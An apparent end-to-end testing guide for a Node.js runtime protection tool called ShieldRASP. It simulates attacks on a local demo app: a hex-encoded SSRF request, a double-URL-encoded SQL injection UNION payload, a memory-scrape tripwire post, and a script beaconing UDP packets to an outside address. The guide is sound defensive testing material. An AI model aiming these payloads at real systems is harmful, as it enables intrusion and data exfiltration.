# ShieldRASP Platform: Advanced E2E Testing Guide

This guide walks you through deeply verifying the **Phase 1-3 Enterprise Upgrades** (DNS Rebinding, Taint Graphs, Context Correlation, and Behavioral Anomalies). You will simulate advanced "Danger Zone" attacker techniques and watch ShieldRASP neutralize them.

## 🛠️ Phase 0: System Initialization 

To see the deep inspection engine in action, you need three terminal windows:

### Terminal 1: Compile the Agent
```powershell
cd c:\Users\soulmad\projects\rasp\shieldrasp
npm run build -w packages/agent
```

### Terminal 2: Start the SIEM Dashboard
```powershell
cd c:\Users\soulmad\projects\rasp\shieldrasp
npm run monitor
```
*(This starts the CLI interface on port 50052 to visualize Attack Chains)*

### Terminal 3: Start the Protected Target
**If using PowerShell:**
```powershell
cd c:\Users\soulmad\projects\rasp\shieldrasp
$env:NODE_OPTIONS = "--require ./packages/agent"
node apps/demo-app/index.js
```
**If using Command Prompt (CMD):**
```cmd
cd c:\Users\soulmad\projects\rasp\shieldrasp
set NODE_OPTIONS=--require ./packages/agent
node apps/demo-app/index.js
```

---

## 🔥 Deep Test 1: Hexadecimal SSRF Evasion (Socket Layer)

**The Attack:** Attackers frequently bypass naïve URL filters by converting `127.0.0.1` into Hexadecimal or Decimal, or abusing URL credentials (`http://localhost@evil.com`).

**Execute the Attack:**
```powershell
curl "http://localhost:8081/vuln/ssrf?url=http://0x7f000001"
```

**How ShieldRASP Destroys It:** 
1. The URL parser might miss `0x7f...`, but before the socket dials, Node delegates to `dns.lookup` or `net.connect`.
2. `hooks/net.ts` strictly interrogates the *final parsed IP* right before the TCP handshake.
3. You will see a `500 Server Error` (ECONNREFUSED/Socket Hangup) because the RASP engine forcibly ripped the socket down native to the OS.
4. **Dashboard Check:** Look for `Raw TCP outbound connection to host: 127.0.0.1`.

---

## 🔥 Deep Test 2: The Memory Scraping Canary (Behavioral)

**The Attack:** Advanced malware often scans V8 process memory for JWT secrets or connection strings instead of exploiting a specific route.

**Execute the Attack:**
We will deliberately trip the global memory tripwire `CAFEBABE_9f8a7b_MEMORY_SCRAPE`.
```powershell
curl -X POST -H "Content-Type: application/json" -d "{`"data`": `"CAFEBABE_9f8a7b_MEMORY_SCRAPE_TRAP`"}" http://localhost:8081/vuln/prototype
```

**How ShieldRASP Destroys It:** 
1. The `inbound.ts` event loop interceptor scans incoming chunks asynchronously.
2. It detects the tripwire hash *before* Express even finishes parsing the JSON.
3. A **Safe Block** is generated (`res.writeHead(403)` is invoked without crashing Node).
4. **Dashboard Check:** You will see an `Anomaly (Memory Scrape)` event explicitly logged.

---

## 🔥 Deep Test 3: The Weighted Taint Graph & Mutation

**The Attack:** Attackers use double/triple URL-encoding (`%2527` = `'`) to slip payloads through regex firewalls.

**Execute the Attack:**
```powershell
curl "http://localhost:8081/vuln/sqli?id=%2527%2520UNION%2520SELECT%2520*%2520FROM%2520secrets--"
```

**How ShieldRASP Destroys It:** 
1. The `TaintContext` recursively unpacks and graph-maps the normalized payload.
2. The Database hook verifies the executing query against the `TaintNode` graph.
3. **Dashboard Check:** The CLI Monitor will flag the exact `SQL Injection` attempt, proving the mutation survived mapping and generated a Block score of `90+`.

---

## 🔥 Deep Test 4: UDP CNC Exfiltration (Protocol Agnostic)

**The Attack:** If an attacker gets RCE, their first objective is usually to download a payload or exfiltrate data via UDP (which traditional WAFs ignore).

**Execute the Attack (Write this temporary script):**
Create a `test-udp.js` in your root folder:
```javascript
// test-udp.js
const dgram = require('dgram');
const client = dgram.createSocket('udp4');
for(let i=0; i<10; i++) {
    client.send(Buffer.from('Malware beacon'), 41234, '8.8.8.8');
}
```
Run it with the agent injected:
```powershell
$env:NODE_OPTIONS = "--require ./packages/agent"
node test-udp.js
```

**How ShieldRASP Destroys It:** 
1. The `behavioral.ts` hook monitors `dgram.Socket.send`.
2. It tracks the `TaintContext` flow network metrics.
3. Upon exceeding the `> 5` threshold of rapid outbound UDP packets, it triggers an `Anomaly (Network)` block, instantly alerting the SIEM to Command & Control (C2) behavior.

---

## 🔥 Deep Test 5: Context Correlation Chain (The Holy Grail)

**The Concept:** Real attacks are lateral. A single request might do: `HTTP Input -> FS Read -> Child Process Exec`.

**How it works in ShieldRASP:**
Every action taken by an attacker pushes a signature into `ctx.requestMeta.flow` (e.g., `http_input`, `fs.write`, `child_process.exec`).
In `engine.ts` (Lines 65-80), the Engine continuously cross-references this array!

If the Engine sees the flow: `[http_input] + [child_process.exec] + [fs.write]`, it identifies the contextual anomaly signature of a persistent webshell installation, and injects a massive `+50` multiplier into the risk score, instantly severing the connection even if the individual commands looked relatively benign.
